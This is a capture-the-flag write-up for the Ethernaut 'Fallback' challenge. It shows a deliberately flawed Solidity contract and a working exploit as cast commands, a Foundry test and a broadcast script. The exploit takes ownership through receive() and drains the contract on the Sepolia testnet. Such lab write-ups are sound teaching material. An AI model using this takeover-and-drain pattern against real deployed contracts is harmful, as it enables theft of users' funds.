## 👾 01. Fallback

<br>

<p align="center">
<img width="300" src="https://github.com/go-outside-labs/ethernaut-foundry-writeups-sol/assets/138340846/8220cf2f-4a89-4816-bfc1-9bb44e402927">
</p>

<br>

### tl; dr

<br>


* in this challenge, we exploit a flawed fallback function to gain control and drain a contract.
  


<br>

```solidity
contract Fallback {

  mapping(address => uint) public contributions;
  address public owner;

  constructor() {
    owner = msg.sender;
    contributions[msg.sender] = 1000 * (1 ether);
  }

  modifier onlyOwner {
        require(
            msg.sender == owner,
            "caller is not the owner"
        );
        _;
    }

  function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if(contributions[msg.sender] > contributions[owner]) {
      owner = msg.sender;
    }
  }

  function getContribution() public view returns (uint) {
    return contributions[msg.sender];
  }

  function withdraw() public onlyOwner {
    payable(owner).transfer(address(this).balance);
  }

  receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }
}
```


<br>

---

### discussion

<br>

* the only way to drain the contract is via `withdraw()`, which can only be called if `msg.sender` is the `owner` (because of the `onlyOwner` modifier).this function will transfer all the funds in the contract to the `owner`'s' address (note that this function is also vulnerable to reentrancy):

<br>

```solidity
function withdraw() public onlyOwner {
    owner.transfer(address(this).balance);
}
```

<br>

* there are two places in the contract where `owner` is updated with `msg.sender`: `contribute()` and the fallback `receive()`.

<br>

* the function `contribute()` allows the `msg.sender` to send `wei` to the contract and to be tracked by the `contributions[]` mapping variable. 
  - if the total contribution made by a user is greater than the one by the actual owner, `msg.sender` will become `owner`. 

<br>

```solidity
  function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if(contributions[msg.sender] > contributions[owner]) {
      owner = msg.sender;
    }
  }
```

<br>


  - however, the contribution made by the user would need to be greater than `1000 eth` (to beat the one made by the owner in the constructor):


<br>

```solidity
  constructor() {
    owner = msg.sender;
    contributions[msg.sender] = 1000 * (1 ether);
  }
```

<br>


* the fallback function `receive()` is a special function that is called "automatically" when some `ether` is sent to the contract without specifying anything in the `calldata` (*i.e.*, calls made with `send()` or `transfer()`).
  * *implementing a fallback function is a good idea if the contract receives `ether` from other wallets or contracts, as they are useful for emitting payment events and checking requirements. every smart contract can only have one fallback function.*
  * here, `receive()` requires that `msg.value > 0` (the function call needs to contain some `wei`) and `contributions[msg.sender] > 0` (the caller has to have donated before). if they pass, `owner` becomes `msg.sender`:

<br>

```solidity
  receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }
```

<br>

---

### 3-lines solution with `cast`

<br>

##### this problem can be solved with 3 lines using foundry's **[cast](https://github.com/foundry-rs/foundry#cast)**:

<br>



1. call `contribute()` with some `wei` so that `contributions[msg.sender] > 0`:

<br>

```shell
> cast send <instance contract> "contribute()" --value `1wei` --private-key=<your private key> --rpc-url=<rpc endpoint to sepolia>

blockHash               0xb691cea544164091a2353aebeb15feede86763298d6136b3231923b36b715b4f
blockNumber             4077851
contractAddress
cumulativeGasUsed       3800590
effectiveGasPrice       3216660017
gasUsed                 47965
logs                    []
logsBloom               0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
```

<br>


2. become `owner` when triggering `receive()` by sending `1 wei` to the contract with an empty data field (i.e., empty `msg.data`):

<br>

```shell
> cast send <instance contract> --value 1wei --private-key=<your private key> --rpc-url=<rpc endpoint to sepolia>

blockHash               0x1bf1ee70a9a9b3d919f93bdfd2f7f1c03325caefbd20522d5b1162c781c8a50c
blockNumber             4077853
contractAddress
cumulativeGasUsed       28302
effectiveGasPrice       3183243793
gasUsed                 28302
logs                    []
logsBloom               0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
root
status                  1
transactionHash         0xa6c2fdecf316c8a57116c89aaee7fb5e3596ddc55f6e4e3bbc812802865c6f77
transactionIndex        0
type                    2
```

<br>

3. call `withdraw()` to drain the contract.

<br>

```shell
> cast send <instance contract> "withdraw()" --private-key=<your private key> --rpc-url=<rpc endpoint to sepolia>

blockHash               0x8ffea8d58449e5f9f2a15d264c851defe4b97ed724a3bf681196390ac8c09bd5
blockNumber             4077855
contractAddress
cumulativeGasUsed       1898453
effectiveGasPrice       3200792076
gasUsed                 30364
logs                    []
logsBloom               0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
root
status                  1
transactionHash         0xd18e25cee0ba55165f0fbed21d9dad6ff227f9c6897fd9178818bf1611064eb0
transactionIndex        2
type                    2
```


<br>

----

### formal solution in `solidity`

<br>

* check `test/01/Fallback.t.sol`:

<br>

```solidity
contract FallbackTest is Test {
    Fallback public level;
    address instance = vm.addr(0x10053); 
    address hacker = vm.addr(0x1337); 

    function setUp() public {
      vm.deal(hacker, 0.0001 ether);
      vm.prank(instance);
      level = new Fallback();
    }

    function testFallbackHack() public {

        vm.startPrank(hacker);

        ////////////////////////////////////////
        //                                    //
        //        STEP 1: RECON               //
        //                                    //
        ////////////////////////////////////////

        ///////////////////////////////////////////
        // Should show the adress of the instance
        //////////////////////////////////////////
        emit log_address(instance);

        ///////////////////////////////////
        // Should be the same as above
        ///////////////////////////////////
        emit log_address(level.owner());

        ///////////////////////////////////
        // Both should be 0, one is the 
        // array contributions[msg.sender], 
        // the other is the owner's balance
        ///////////////////////////////////
        emit log_uint(level.getContribution());
        emit log_uint(instance.balance);

        ///////////////////////////////////
        // Should be 1 ether as set above
        // (1000000000000000000)
        ///////////////////////////////////
        emit log_address(hacker);
        emit log_uint(hacker.balance);
        

        ////////////////////////////////////////
        //                                    //
        //        STEP 2: contribute()        //
        //                                    //
        ////////////////////////////////////////

        ////////////////////////////////////////
        // contribute with msg.sender to hacker
        ////////////////////////////////////////
        level.contribute{value: 1 wei}();

        /////////////////////////////////// 
        // Should be 999999999999999999 and
        // contributions[msg.sender] is 1
        ///////////////////////////////////
        emit log_uint(hacker.balance);
        emit log_uint(level.getContribution());


        ////////////////////////////////////////
        //                                    //
        //    STEP 3: TRIGGER FALLBACK        //
        //                                    //
        ////////////////////////////////////////

        /////////////////////////////////////
        // call send() to trigger receive(), 
        // hacker should be the owner
        /////////////////////////////////////
        (bool sent, ) = address(level).call{value: 1 wei}("");
        require(sent, "Failed to call send()");
        assertEq(level.owner(), hacker);
        

        ////////////////////////////////////////
        //                                    //
        //     STEP 4: DRAIN CONTRACT         //
        //                                    //
        ////////////////////////////////////////
        level.withdraw();
        
        vm.stopPrank();
        
        }
}
```

<br>

* which can be run with:

<br>

```shell
> forge test --match-contract FallbackTest -vvvv    

Running 1 test for test/01/Fallback.t.sol:FallbackTest
[32m[PASS][0m testFallbackHack() (gas: 84561)
Logs:
  0x7e5f4552091a69125d5dfcb7b8c2659029395bdf
  0x7e5f4552091a69125d5dfcb7b8c2659029395bdf
  0
  0
  0x2b5ad5c4795c026514f8317c7a215e218dccd6cf
  100000000000000
  99999999999999
  1

Traces:
  [84561] [32mFallbackTest[0m::[32mtestFallbackHack[0m() [33m[0m
    ├─ emit [36mlog_address[0m(: 0x7E5F4552091A69125d5DfCb7b8C2659029395Bdf)
    ├─ [2359] [32mFallback[0m::[32mowner[0m() [33m[staticcall][0m
    │   └─ [32m← [0m0x7E5F4552091A69125d5DfCb7b8C2659029395Bdf
    ├─ emit [36mlog_address[0m(: 0x7E5F4552091A69125d5DfCb7b8C2659029395Bdf)
    ├─ [2418] [32mFallback[0m::[32mgetContribution[0m() [33m[staticcall][0m
    │   └─ [32m← [0m0
    ├─ emit [36mlog_uint[0m(: 0)
    ├─ emit [36mlog_uint[0m(: 0)
    ├─ emit [36mlog_address[0m(: 0x2B5AD5c4795c026514f8317c7a215E218DcCD6cF)
    ├─ emit [36mlog_uint[0m(: 100000000000000 [2;49;39m[1e14][0m)
    ├─ [0] [34mVM[0m::[34mstartPrank[0m(0x2B5AD5c4795c026514f8317c7a215E218DcCD6cF) [33m[0m
    │   └─ [34m← [0m()
    ├─ [24928] [32mFallback[0m::[32mcontribute[0m{value: 1}() [33m[0m
    │   └─ [32m← [0m()
    ├─ emit [36mlog_uint[0m(: 99999999999999 [2;49;39m[9.999e13][0m)
    ├─ [418] [32mFallback[0m::[32mgetContribution[0m() [33m[staticcall][0m
    │   └─ [32m← [0m1
    ├─ emit [36mlog_uint[0m(: 1)
    ├─ [3323] [32mFallback[0m::[32mreceive[0m{value: 1}() [33m[0m
    │   └─ [32m← [0m()
    ├─ [359] [32mFallback[0m::[32mowner[0m() [33m[staticcall][0m
    │   └─ [32m← [0m0x2B5AD5c4795c026514f8317c7a215E218DcCD6cF
    ├─ [7277] [32mFallback[0m::[32mwithdraw[0m() [33m[0m
    │   ├─ [0] [32m0x2B5AD5c4795c026514f8317c7a215E218DcCD6cF[0m::[32mfallback[0m{value: 2}() [33m[0m
    │   │   └─ [32m← [0m()
    │   └─ [32m← [0m()
    ├─ [0] [34mVM[0m::[34mstopPrank[0m() [33m[0m
    │   └─ [34m← [0m()
    └─ [32m← [0m()

Test result: [32mok[0m. 1 passed; 0 failed; 0 skipped; finished in 813.92µs
Ran 1 test suites: 1 tests passed, 0 failed, 0 skipped (1 total tests)
```



<br>

* and submitted with `script/01/Fallback.s.sol`:

<br>

```solidity
contract Exploit is Script {

        address instance = vm.envAddress("INSTANCE_LEVEL1");
        address hacker = vm.rememberKey(vm.envUint("PRIVATE_KEY"));
        Fallback level = Fallback(payable(instance));
      
        function run() external {
            vm.startBroadcast(hacker);
            level.contribute{value: 1 wei}();
            (bool success, ) = address(level).call{value: 1 wei}("");
            require(success, "failed to call send()");
            level.withdraw();
            vm.stopBroadcast();
    }
}
```

<br>

* by running:

<br>

```shell
> forge script ./script/01/Fallback.s.sol --broadcast -vvvv --rpc-url sepolia

Traces:
  [59628] [32mExploit[0m::[32mrun[0m() [33m[0m
    ├─ [0] [34mVM[0m::[34menvUint[0m(PRIVATE_KEY) [33m[staticcall][0m
    │   └─ [34m← [0m<env var value>
    ├─ [0] [34mVM[0m::[34mstartBroadcast[0m(<pk>) [33m[0m
    │   └─ [34m← [0m()
    ├─ [7801] [32m0xD4E2471CA863251b61a1009223Ee23D2F23f057d[0m::[32mcontribute[0m{value: 1}() [33m[0m
    │   └─ [32m← [0m()
    ├─ [502] [32m0xD4E2471CA863251b61a1009223Ee23D2F23f057d[0m::[32mfallback[0m{value: 1}() [33m[0m
    │   └─ [32m← [0m()
    ├─ [7300] [32m0xD4E2471CA863251b61a1009223Ee23D2F23f057d[0m::[32mwithdraw[0m() [33m[0m
    │   ├─ [0] [32m0x93Bc9E22Af0d4791E6AA31b4D845F750b32966ad[0m::[32mfallback[0m{value: 2}() [33m[0m
    │   │   └─ [32m← [0m()
    │   └─ [32m← [0m()
    ├─ [0] [34mVM[0m::[34mstopBroadcast[0m() [33m[0m
    │   └─ [34m← [0m()
    └─ [32m← [0m()


[32mScript ran successfully.[0m
==========================
Simulated On-chain Traces:

  [32473] [32m0xD4E2471CA863251b61a1009223Ee23D2F23f057d[0m::[32mcontribute[0m{value: 1}() [33m[0m
    └─ [32m← [0m()

  [27095] [32m0xD4E2471CA863251b61a1009223Ee23D2F23f057d[0m::[32mfallback[0m{value: 1}() [33m[0m
    └─ [32m← [0m()

  [32261] [32m0xD4E2471CA863251b61a1009223Ee23D2F23f057d[0m::[32mwithdraw[0m() [33m[0m
    ├─ [0] [32m0x93Bc9E22Af0d4791E6AA31b4D845F750b32966ad[0m::[32mfallback[0m{value: 2}() [33m[0m
    │   └─ [32m← [0m()
    └─ [32m← [0m()


==========================

Chain 11155111

Estimated gas price: 3.645290764 gwei

Estimated total gas used for script: 119376

Estimated amount required: 0.000435160230243264 ETH

==========================

###
Finding wallets for all the necessary addresses...
##
Sending transactions [0 - 2].

##
Waiting for receipts.

##### sepolia
✅  [Success]Hash: 0xd47b8ce14de27a974032f323d42f3cb2eae5ab09d2784458353aec217f58f36e
Block: 4092414
Paid: 0.000095368384115325 ETH (28865 gas * 3.303945405 gwei)


##### sepolia
✅  [Success]Hash: 0x5a9df9632d5633530f57240a7affe36237f8ec05c913d9f150571940f4f9dd89
Block: 4092414
Paid: 0.00008425721571831 ETH (25502 gas * 3.303945405 gwei)


##### sepolia
✅  [Success]Hash: 0x50f13132884b4b22e4abd40c5bd21a7205b4651c85cc9b38e0a82a47e9a83be1
Block: 4092414
Paid: 0.00010032099827742 ETH (30364 gas * 3.303945405 gwei)

==========================

ONCHAIN EXECUTION COMPLETE & SUCCESSFUL.
Total Paid: 0.000279946598111055 ETH (84731 gas * avg 3.303945405 gwei)
```

<br>

----

### pwned...


<br>

  
<p align="center">
<img width="400" src="https://github.com/go-outside-labs/ethernaut-foundry-writeups-sol/assets/138340846/ba3f82a3-00c0-43f9-a423-588d7f6e4c70">
</p>



